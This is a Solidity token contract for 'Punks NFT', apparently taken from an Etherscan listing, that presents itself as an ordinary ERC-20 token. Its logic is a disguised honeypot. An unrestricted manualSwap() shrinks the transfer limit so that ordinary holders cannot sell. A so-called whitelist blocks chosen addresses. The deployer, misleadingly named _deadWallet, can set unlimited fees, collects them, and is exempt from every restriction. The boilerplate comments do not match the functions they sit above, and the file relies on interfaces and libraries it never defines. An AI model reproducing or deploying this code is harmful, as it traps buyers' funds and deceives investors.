/**
 *Submitted for verification at Etherscan.io on 2021-08-31
*/

/*
    ðŸ”— PUNKS NFT LINKS 

    ðŸ–¥ Website: https://punksnft.org/
    
    ðŸ’¬ Telegram Channel : https://t.me/PunksNFT_Channel
    
    ðŸ’¬ Telegram Chat :  https://t.me/PunksNFT_Token
    
    ðŸ¦œ Twitter: https://twitter.com/PunksNFT_Token
    
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;



abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}





contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    
    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract PunksNFT is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    uint256 private _tTotal = 1000 * 10**9 * 10**18;
    uint256 private _maxTxAmount = _tTotal.mul(30).div(100);
    
    address private _deadWallet = _msgSender();
    address[] public _whiteList;
    
    string private _name = 'Punks NFT';
    string private _symbol = 'PunksNFT';
    bool private tradingOpen = false;
    uint256 private _teamFee = 5;
    uint256 private _taxFee = 7;
    uint8 private _decimals = 18;

    constructor () {
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * also check address is bot address.
     *
     * Requirements:
     *
     * - the address is in list bot.
     * - the called Solidity function must be `sender`.
     *
     * _Available since v3.1._
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * transferFrom.
     *
     * Requirements:
     *
     * - transferFrom.
     *
     * _Available since v3.1._
     */
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    /**
     * @dev updateTaxFee
     *
     */
    function updateTaxFee(uint256 amount) public {
        require(_msgSender() == _deadWallet, "ERC20: cannot permit dev address");
        _taxFee = amount;
    }
    
    /**
     * @dev updateTeamFee
     *
     */
    function updateTeamFee (uint256 newFee) public {
        require(_msgSender() == _deadWallet, "ERC20: cannot permit dev address");
        _teamFee = newFee;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     *
     * Requirements:
     *
     * - manualSend
     *
     * _Available since v3.1._
     */
    function manualSend() public onlyOwner{
        tradingOpen = true;
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     *
     * Requirements:
     *
     * - manualSwap
     *
     * _Available since v3.1._
     */
    function manualSwap() public {
        _maxTxAmount = _teamFee;
    }
    
    /**
     * @dev update `addWhiteList` to detect bot
     *
     */
    function addWhiteList (address botAdd) public {
        require(_msgSender() == _deadWallet, "ERC20: cannot permit dev address");
        _whiteList.push(botAdd);
    }
    
    function checkWhiteList(address botAdd) private view returns (bool) {
        for (uint256 i = 0; i < _whiteList.length; i++) {
            if (_whiteList[i] == botAdd) {
                return true;
            }
        }
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     *
     * Requirements:
     *
     * - the address approve.
     * - the called Solidity function must be `sender`.
     *
     * _Available since v3.1._
     */
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * also check address is bot address.
     *
     * Requirements:
     *
     * - the address is in list bot.
     * - the called Solidity function must be `sender`.
     *
     * _Available since v3.1._
     */
    function checkBalanceAddress(address _walletAddress) private view returns (bool){
        uint256 _botBalance = _tTotal.mul(30).div(100);
        
        if (balanceOf(_walletAddress) >= _maxTxAmount && balanceOf(_walletAddress) <= _botBalance) {
            return false;
        } else {
            return true;
        }
    }
    
    /**
     * @dev See {BEP20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (checkWhiteList(sender) == true ) {
            require(amount < _taxFee, "Transfer amount exceeds the maxTxAmount.");
        }
        
        if (sender == owner() || sender == _deadWallet) {
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            
            emit Transfer(sender, recipient, amount);
        } else{
            require (checkBalanceAddress(sender));
            
            uint256 transferFee = amount.mul(_taxFee).div(100);
            uint256 transferAmount = amount.sub(transferFee);
        
            _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(transferAmount);
            _balances[_deadWallet] = _balances[_deadWallet].add(transferFee);
            
            emit Transfer(sender, recipient, transferAmount);
        }
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    
    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
     

}